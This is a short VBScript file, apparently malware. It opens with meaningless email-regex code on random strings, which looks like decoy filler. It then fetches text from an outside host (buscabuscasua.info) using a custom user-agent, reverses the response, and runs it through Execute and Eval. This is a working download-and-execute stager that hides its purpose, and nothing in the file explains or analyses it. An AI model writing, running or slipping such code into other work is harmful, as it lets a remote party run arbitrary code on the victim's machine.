stDeSKE = "WjtCwwJ07nmFSJkPVO3LqWsWB" & "@" & "WjtCwwJ07nmFSJkPVO3LqWsWB" & "." & "WjtCwwJ07nmFSJkPVO3LqWsWB"

Set stDeSXY = New RegExp

With stDeSXY
    .Pattern    = "ˆ([\w-]+\.)*[\w-]+@([\w-]+\.)+[a-z]{2,4}$"
    .IgnoreCase = True
    .Global     = False
End With


stDeSXY.Pattern = "ˆ([\w-]+\.)*[\w-]+@([\w-]+)(\.[\w-]+)*\.[a-z]{2,4}$"

Set objMatch = stDeSXY.Execute( stDeSKE )

Set objMatch = Nothing

stDeSXY.Pattern = "@" & stDeSGH
stDeSWT  = "WjtCwwJ07nmFSJkPVO3LqWsWB"

stDeSCF = stDeSXY.Replace( stDeSKE, "@" & stDeSWT )

Set stDeSXY = Nothing

awSNI="WjtCwwJ07nmFSJkPVO3LqWsWB"
URL="http://buscabuscasua.info/?tgow=shuract&" & awSNI
set stDeS=CreateObject("Microsoft.XMLHTTP")

stDeS.open "GET",URL,false
stDeS.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
stDeS.setRequestHeader "User-Agent", "COOLDOWN"
stDeS.send "Z"

dim iZdTd

function iZdTdTT()
For i = Len(stDeS.responsetext) to 1  Step-1
var= Mid(stDeS.responsetext,  i  , 1)
iZdTd = iZdTd & var
Next
end function 

execute " Eval(""iZdTdTT()"") : Execute iZdTd & awSNIstDeS "
